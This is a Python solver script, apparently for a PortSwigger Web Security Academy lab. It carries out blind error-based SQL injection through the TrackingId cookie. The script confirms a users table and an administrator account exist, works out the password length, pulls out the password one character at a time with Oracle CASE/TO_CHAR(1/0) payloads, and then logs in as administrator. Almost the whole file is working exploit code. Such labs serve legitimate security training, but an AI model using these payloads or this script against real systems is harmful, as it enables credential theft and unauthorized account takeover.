import requests
import re
import sys
import string

url = "https://0adc009404cbd2b980101c19005000e8.web-security-academy.net/"
tracking_id = "z7hIfSfE897ZCt6B"
session = "6Caw9ZU23JtHbwmdIhOXiKhvzWlhG7pN"



# Helper Functions
def check_condition(payload_suffix):
    """
    Returns True if the injected payload causes an error (HTTP 500),
    False otherwise (HTTP 200 or other).
    """
    cookies = {
        "TrackingId": tracking_id + payload_suffix,
        "session": session
    }
    try:
        resp = requests.get(url, cookies=cookies, timeout=5)
        return resp.status_code == 500
    except:
        return False

def get_csrf_token(session, url):
    """Extracts CSRF token from login page."""
    resp = session.get(url)
    match = re.search(r'name="csrf"\s+value="([^"]+)"', resp.text)
    return match.group(1) if match else None

def login_as_administrator(password):
    """Logs in with the extracted password."""
    login_url = url + "login"
    session = requests.Session()
    
    csrf_token = get_csrf_token(session, login_url)
    login_data = {"username": "administrator", "password": password}
    if csrf_token:
        login_data["csrf"] = csrf_token
    
    resp = session.post(login_url, data=login_data)
    if "Your username is: administrator" in resp.text or "/my-account" in resp.url:
        print("[+] Login successful!")
        return True
    else:
        print("[-] Login failed.")
        return False



# SQL Injections Steps
def step1_verify_users_table():
    print("[*] Step 1: Checking if 'users' table exists...")
    payload = "'||(SELECT '' FROM users WHERE ROWNUM=1)||'"
    resp = requests.get(url, cookies={
        "TrackingId": tracking_id + payload,
        "session": session
    })
    if resp.status_code != 500:
        print("[+] Table 'users' exists.")
        return True
    else:
        print("[-] Table 'users' does NOT exist (or query invalid).")
        return False

def step2_verify_administrator():
    print("[*] Step 2: Checking if 'administrator' user exists...")
    payload = f"'||(SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='administrator')>0 THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
    if check_condition(payload):
        print("[+] User 'administrator' exists (error triggered).")
        return True
    else:
        print("[-] User 'administrator' not found.")
        return False

def step3_find_password_length(max_guess=30):
    print("[*] Step 3: Determining password length...")
    length = 0
    for i in range(1, max_guess + 1):
        payload = f"'||(SELECT CASE WHEN LENGTH(password)>{i-1} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        if check_condition(payload):
            length = i
            print(f"    → Password length is at least {length}")
        else:
            break
    print(f"[+] Password length confirmed: {length} characters.")
    return length

def step4_extract_password(length, charset=string.ascii_lowercase + string.digits):
    print(f"[*] Step 4: Extracting {length}-character password...")
    password = ""
    for pos in range(1, length + 1):
        found = False
        for ch in charset:
            payload = f"'||(SELECT CASE WHEN SUBSTR(password,{pos},1)='{ch}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            if check_condition(payload):
                password += ch
                print(f"    Position {pos:2d} : '{ch}' → {password}")
                found = True
                break
        if not found:
            print(f"[-] No character found at position {pos} – check charset or injection.")
            sys.exit(1)
    return password



# Final ExecutionPart
def main():
    
    if not step1_verify_users_table():
        print("[-] Users table missing. Exiting.")
        return
    if not step2_verify_administrator():
        return
    
    pass_len = step3_find_password_length()
    if pass_len == 0:
        print("[-] Could not determine password length.")
        return
    
    password = step4_extract_password(pass_len)
    print(f"\n[SUCCESS] Extracted password: {password}")
    
    print("\n[*] Attempting to log in as administrator...")
    if login_as_administrator(password):
        print("\nPassword extracted and login performed.")
    else:
        print(f"\nLogin failed.")

if __name__ == "__main__":
    main()